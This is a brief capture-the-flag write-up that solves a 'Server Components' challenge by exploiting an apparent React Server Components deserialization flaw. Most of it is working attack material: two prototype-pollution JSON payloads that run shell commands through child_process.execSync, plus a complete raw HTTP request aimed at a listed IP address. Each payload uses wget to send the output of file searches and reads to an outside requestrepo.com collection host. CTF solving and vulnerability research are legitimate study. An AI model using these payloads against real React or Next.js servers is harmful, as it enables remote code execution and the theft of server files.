#### Server Components
- points earned: 932
#### Where's the flag?
- There's no source code with this challenge so the flag location is unknown.
- Note: upon reviewing this challenge, I saw that there WAS source code with this challenge and a note about flag submission so I think it was added at some point.
#### Notes / Intuition
- Based on the title of the challenge `Server Components` I'm think that this is a React Server Components vulnerability so I jump right into exploits using https://gist.github.com/maple3142/48bc9393f45e068cf8c90ab865c0f5f3 as a reference.

#### Solution
- I used 2 payloads.  1 to find the flag and another to read the flag.
- Find
```json
{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"process.mainModule.require('child_process').execSync('wget http://m5keli1g.requestrepo.com?flag=`find / -name flag.txt 2>/dev/null`');","_formData":{"get":"$1:constructor:constructor"}}}
```
- Read
```json
{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"process.mainModule.require('child_process').execSync('wget http://m5keli1g.requestrepo.com?flag=`cat /opt/flag.txt`');","_formData":{"get":"$1:constructor:constructor"}}}
```
- The actual HTTP request looked like this
```http
POST / HTTP/1.1
Host: 23.179.17.92:5555
Next-Action: x
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Length: 459

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"process.mainModule.require('child_process').execSync('wget http://m5keli1g.requestrepo.com?flag=`cat /opt/flag.txt`');","_formData":{"get":"$1:constructor:constructor"}}}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
```